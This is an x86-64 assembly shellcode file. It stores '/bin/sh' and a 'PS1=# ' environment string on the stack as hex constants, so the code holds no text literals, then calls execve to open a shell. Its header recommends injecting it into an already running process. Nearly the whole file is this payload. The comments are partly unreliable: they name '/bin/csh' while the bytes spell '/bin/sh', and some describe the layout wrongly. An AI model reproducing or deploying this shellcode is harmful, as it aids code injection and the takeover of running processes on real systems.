# Spawns "/bin/csh" without any text literals in the code
# ... i.e. this could be good for injecting into an already 
# running process

  .text

.global _start

_start:
  # Push rbp on the stack
  push %rbp
  # Move the stack pointer to rbp
  mov %rsp, %rbp
  # Reserve 48 bytes for data on the stack
  sub $0x30, %rsp

  # We need:
  #   7 Bytes for "/bin/sh"
  #   1 Bytes zero to terminate str
  #   6 Bytes for "PS1=# "
  #   1 Bytes zero to terminate str
  #   8 Bytes pointer to "/bin/csh"
  #   8 Bytes to termintate this pointer list
  #   8 Bytes pointer to "PS1=#"
  #   8 Bytes zero to terminate pointer list

  # Put "/bin/csh" in our reserved space
  movl $0x6e69622f, -48(%rbp)
  movl $0x0068732f, -44(%rbp)
  # Put "PS1=#\0" in our reserved space
  # null to termintate this string
  movl $0x3d315350, -40(%rbp)
  movl $0x00002023, -36(%rbp)

  # Get address of "/bin/csh"
  xor %r8, %r8
  lea -48(%rbp), %r8
  # Place it on the stack
  movq %r8, -32(%rbp)
  # Place a null terminator after it
  movq $0x0, -24(%rbp)
  
  # Get address of "PS1=#"
  xor %r8, %r8
  lea -40(%rbp), %r8
  # Place it on the stack
  movq %r8, -16(%rbp)
  # Place a null terminator after it
  movq $0x0, -8(%rbp)
  
  
  # Syscall number for execve
  mov $59, %rax
  # Zero rdi
  xor %rdi, %rdi
  # Load the string ptr into rdi
  lea -48(%rbp), %rdi
  # Zero rsi
  xor %rsi, %rsi
  # Get a pointer to the pointer we put on the stack earlier
  lea -32(%rbp), %rsi
  lea -16(%rbp), %rdx
  # Open the shell
  syscall

  # Exit cleanly
  mov $60, %rax
  xor %rdi, %rdi
  syscall
